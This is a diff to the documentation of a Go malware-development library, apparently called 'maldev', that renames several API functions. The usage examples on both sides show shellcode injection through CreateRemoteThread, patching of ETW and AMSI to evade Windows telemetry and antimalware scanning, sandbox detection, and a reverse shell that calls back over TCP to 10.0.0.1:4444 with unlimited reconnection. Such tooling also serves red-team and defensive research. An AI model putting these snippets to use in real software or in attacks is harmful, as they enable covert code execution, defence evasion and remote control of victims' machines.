@@ -72,7 +72,7 @@ import (
 )
 
 func main() {
-	shellcode, err := inject.ReadShellcode("payload.bin")
+	shellcode, err := inject.Read("payload.bin")
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -179,7 +179,7 @@ Overwrites all five ETW event writing functions (`EtwEventWrite`, `EtwEventWrite
 import "github.com/oioio-space/maldev/evasion/etw"
 
 err := etw.PatchAll(nil)     // patches all ETW functions + NtTraceEvent
-err = etw.PatchETW(nil)      // patches only the 5 ETW functions
+err = etw.Patch(nil)      // patches only the 5 ETW functions
 err = etw.PatchNtTraceEvent(nil) // patches only NtTraceEvent
 ```
 
@@ -269,7 +269,7 @@ if sandboxed, reason, _ := checker.IsSandboxed(); sandboxed {
 ```go
 import "github.com/oioio-space/maldev/inject"
 
-shellcode, _ := inject.ReadShellcode("payload.bin")
+shellcode, _ := inject.Read("payload.bin")
 
 cfg := &inject.Config{
     Method: inject.MethodCreateRemoteThread,
@@ -386,7 +386,7 @@ import (
     "github.com/oioio-space/maldev/c2/transport"
 )
 
-trans := transport.NewTCPTransport("10.0.0.1:4444", 10*time.Second)
+trans := transport.NewTCP("10.0.0.1:4444", 10*time.Second)
 
 cfg := &shell.Config{
     MaxRetries:    0, // unlimited reconnection
@@ -465,7 +465,7 @@ caller = wsyscall.New(
 
 // Pass the caller to any technique that accepts *wsyscall.Caller
 err := amsi.PatchScanBuffer(caller)
-err = etw.PatchETW(caller)
+err = etw.Patch(caller)
 err = blockdlls.Enable(caller)
 err = acg.Enable(caller)
 ```
